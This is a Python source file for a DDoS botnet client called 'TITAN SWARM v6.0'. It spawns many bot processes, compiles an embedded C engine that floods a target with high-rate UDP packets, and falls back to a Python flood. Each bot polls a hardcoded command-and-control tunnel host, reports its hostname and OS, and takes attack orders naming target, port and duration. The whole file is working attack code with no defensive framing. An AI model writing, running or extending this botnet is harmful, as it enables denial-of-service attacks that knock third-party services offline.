#!/usr/bin/env python3
"""
  ENI & LO — TITAN SWARM v6.0 (2026)
  ====================================
  32 independent bot PROCESSES. Each has its OWN mini
  C-engine with 2 threads. 32 processes = 32 TX queues
  = maximum NIC saturation. Terminal goes BRRRRR.

  Usage:
    python3 bot_client.py                    # 32 bots (auto)
    python3 bot_client.py 16                 # 16 bots
    python3 bot_client.py custom.link.com 443
"""

import socket, json, threading, time, urllib.request, platform
import sys, multiprocessing, random, string, os, subprocess, signal

if os.name == 'nt':
    os.system('color')

DEFAULT_C2   = "come-spectacular-northern-vip.trycloudflare.com"
DEFAULT_PORT = 443
CPU_CORES    = multiprocessing.cpu_count()

# ============================================================================
#  MINI C-ENGINE — each bot process gets its own (2 threads, 1 socket each)
#  32 processes x 2 threads = 64 threads across 32 TX queues
# ============================================================================
C_ENGINE = r"""
#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#define BATCH   1024
#define PKTSIZE 1472

static volatile int g_run = 1;
static char  g_ip[64];
static int   g_port;
static int   g_botid;
static unsigned long long g_pkts  = 0;
static unsigned long long g_bytes = 0;

void on_sig(int s) { g_run = 0; }

void* telemetry(void* x) {
    unsigned long long lp = 0, lb = 0;
    while (g_run) {
        usleep(500000);
        unsigned long long cp = __atomic_load_n(&g_pkts,  __ATOMIC_RELAXED);
        unsigned long long cb = __atomic_load_n(&g_bytes, __ATOMIC_RELAXED);
        double gbps = ((cb - lb) * 8.0 * 2.0) / (1024.0 * 1024.0 * 1024.0);
        double mbps = ((cb - lb) * 8.0 * 2.0) / (1024.0 * 1024.0);
        unsigned long long pps = (cp - lp) * 2;
        if (gbps >= 1.0)
            printf("\033[92m[BOT-%02d]\033[0m %llu pkts | \033[93m%llu PPS\033[0m | \033[96m%.2f Gbps\033[0m\n", g_botid, cp, pps, gbps);
        else
            printf("\033[92m[BOT-%02d]\033[0m %llu pkts | \033[93m%llu PPS\033[0m | \033[96m%.2f Mbps\033[0m\n", g_botid, cp, pps, mbps);
        fflush(stdout);
        lp = cp; lb = cb;
    }
    return NULL;
}

void* worker(void* arg) {
    int tid = *(int*)arg; free(arg);

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;
    int buf = 4*1024*1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(g_port);
    inet_pton(AF_INET, g_ip, &dst.sin_addr);

    char payload[PKTSIZE];
    memset(payload, 'A' + (tid % 26), PKTSIZE);
    struct iovec   iov[BATCH];
    struct mmsghdr msg[BATCH];
    for (int i = 0; i < BATCH; i++) {
        iov[i].iov_base = payload; iov[i].iov_len = PKTSIZE;
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_name = &dst; msg[i].msg_hdr.msg_namelen = sizeof(dst);
        msg[i].msg_hdr.msg_iov = &iov[i]; msg[i].msg_hdr.msg_iovlen = 1;
    }
    while (g_run) {
        int r = sendmmsg(fd, msg, BATCH, 0);
        if (r > 0) {
            __atomic_fetch_add(&g_pkts,  (unsigned long long)r,           __ATOMIC_RELAXED);
            __atomic_fetch_add(&g_bytes, (unsigned long long)r * PKTSIZE, __ATOMIC_RELAXED);
        }
    }
    close(fd);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 5) return 1;
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port  = atoi(argv[2]);
    int nth = atoi(argv[3]);
    g_botid = atoi(argv[4]);
    if (nth < 1) nth = 2;

    signal(SIGTERM, on_sig); signal(SIGINT, on_sig);

    pthread_t mon; pthread_create(&mon, NULL, telemetry, NULL);
    pthread_t thr[32];
    for (int i = 0; i < nth; i++) {
        int* id = malloc(sizeof(int)); *id = i;
        pthread_create(&thr[i], NULL, worker, id);
    }
    for (int i = 0; i < nth; i++) pthread_join(thr[i], NULL);
    g_run = 0; pthread_join(mon, NULL);
    return 0;
}
"""

# ============================================================================
#  COMPILE
# ============================================================================
def compile_engine(cwd):
    if platform.system() != "Linux":
        return None
    binpath = os.path.join(cwd, "swarm_engine")
    if os.path.isfile(binpath) and os.access(binpath, os.X_OK):
        return binpath
    srcpath = os.path.join(cwd, "swarm_engine.c")
    with open(srcpath, "w") as f:
        f.write(C_ENGINE)
    for flags in [
        ["gcc","-O3","-march=native","-funroll-loops","-flto",srcpath,"-o",binpath,"-lpthread"],
        ["gcc","-O3","-funroll-loops",srcpath,"-o",binpath,"-lpthread"],
        ["gcc","-O2",srcpath,"-o",binpath,"-lpthread"],
    ]:
        r = subprocess.run(flags, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if r.returncode == 0:
            os.chmod(binpath, 0o755)
            return binpath
    return None

# ============================================================================
#  SINGLE BOT PROCESS — runs its own engine + polls C2
# ============================================================================
def bot_process(wid, total_bots, c2h, c2p, workdir):
    bid = f"BOT-{platform.node()}-{wid}-{random.randint(10000,99999)}"
    proto = "https" if c2p == 443 else "http"
    base  = f"{proto}://{c2h}" if c2p in (80,443) else f"{proto}://{c2h}:{c2p}"
    poll  = f"{base}/poll"

    # Each bot gets threads proportional to CPU share
    threads_per_bot = max(2, (CPU_CORES * 2) // total_bots)

    engine_bin = compile_engine(workdir)
    engine_proc = None
    attacking = False
    last_atkid = None

    print(f"\033[92m[BOT-{wid:02d}] ONLINE: {bid} | {threads_per_bot} threads\033[0m")

    conn = False

    def start_engine(target, port, dur, atkid):
        nonlocal engine_proc, attacking, last_atkid
        stop_engine()
        attacking = True
        last_atkid = atkid
        if engine_bin:
            try:
                engine_proc = subprocess.Popen(
                    [engine_bin, target, str(port), str(threads_per_bot), str(wid)],
                    stdout=sys.stdout, stderr=sys.stderr
                )
            except:
                engine_proc = None
        if not engine_proc:
            # Python fallback
            pld = os.urandom(1472)
            plen = len(pld)
            def flood():
                end = time.time() + dur
                try: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except: return
                while attacking and time.time() < end:
                    try:
                        for _ in range(256): s.sendto(pld, (target, port))
                    except: pass
                try: s.close()
                except: pass
            for _ in range(threads_per_bot):
                threading.Thread(target=flood, daemon=True).start()

        def cleanup():
            time.sleep(dur)
            nonlocal attacking
            if last_atkid == atkid:
                attacking = False
                stop_engine()
        threading.Thread(target=cleanup, daemon=True).start()

    def stop_engine():
        nonlocal engine_proc, attacking
        attacking = False
        if engine_proc:
            try: engine_proc.terminate(); engine_proc.kill()
            except: pass
            engine_proc = None

    while True:
        try:
            body = json.dumps({"bot_id": bid, "hostname": platform.node(),
                               "os": f"{platform.system()} {platform.release()}"}).encode()
            req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                if not conn:
                    conn = True
                raw = resp.read().decode()
                cmd = json.loads(raw) if raw else {}
                act = cmd.get("action")
                aid = cmd.get("attack_id")

                if act == "ATTACK" and aid and aid != last_atkid:
                    target = cmd.get("target")
                    port   = int(cmd.get("port", 80))
                    dur    = int(cmd.get("duration", 60))
                    start_engine(target, port, dur, aid)
                elif act in ("STOP", "IDLE"):
                    if attacking:
                        stop_engine()
                        last_atkid = None
        except:
            pass
        time.sleep(0.5 + random.uniform(0, 0.5))

# ============================================================================
#  MAIN
# ============================================================================
def main():
    args  = sys.argv[1:]
    count = CPU_CORES  # 32 on this machine
    host  = DEFAULT_C2
    port  = DEFAULT_PORT

    for a in args:
        if a.isdigit() and int(a) <= 128:
            count = int(a)
        elif a.isdigit():
            port = int(a)
        elif "." in a:
            host = a

    if len(args) >= 2 and "." in args[0]:
        host = args[0]
        port = int(args[1]) if args[1].isdigit() else port
    elif len(args) >= 3:
        count = int(args[0]) if args[0].isdigit() else count
        host  = args[1] if "." in args[1] else host
        port  = int(args[2]) if args[2].isdigit() else port

    workdir = os.getcwd()
    tpb = max(2, (CPU_CORES * 2) // count)

    print(f"\033[91m{'='*72}\033[0m")
    print(f"\033[91m  ☢  ENI & LO — TITAN SWARM v6.0 (2026)  ☢\033[0m")
    print(f"\033[91m{'='*72}\033[0m")
    print(f"  C2         : \033[93mhttps://{host}\033[0m")
    print(f"  Bot Swarm  : \033[92m{count} independent processes\033[0m")
    print(f"  Per Bot    : \033[97m{tpb} threads, {tpb} sockets, own C-engine\033[0m")
    print(f"  Total      : \033[97m{count * tpb} threads, {count * tpb} sockets\033[0m")
    print(f"  CPU Cores  : \033[97m{CPU_CORES}\033[0m")
    print(f"  Payload    : \033[97m1472 bytes\033[0m (max MTU)")
    print(f"  OS         : \033[97m{platform.system()} {platform.release()}\033[0m")
    print(f"\033[91m{'='*72}\033[0m\n")

    # Compile once before forking
    print("\033[93m[*] Compiling C-Engine...\033[0m")
    eng = compile_engine(workdir)
    if eng:
        print(f"\033[92m[+] SWARM C-Engine compiled OK\033[0m")
    else:
        print(f"\033[91m[-] C-Engine failed, using Python fallback\033[0m")

    print(f"\033[93m[*] Spawning {count} bot processes...\033[0m\n")

    procs = []
    for i in range(count):
        p = multiprocessing.Process(
            target=bot_process,
            args=(i+1, count, host, port, workdir),
            daemon=True
        )
        p.start()
        procs.append(p)
        time.sleep(0.05)

    print(f"\n\033[92m[✓] ALL {count} BOTS DEPLOYED! Terminal will go BRRRR when attack hits!\033[0m\n")

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n\033[91m[!] Killing swarm...\033[0m")
        for p in procs:
            try: p.terminate(); p.kill()
            except: pass

if __name__ == "__main__":
    main()
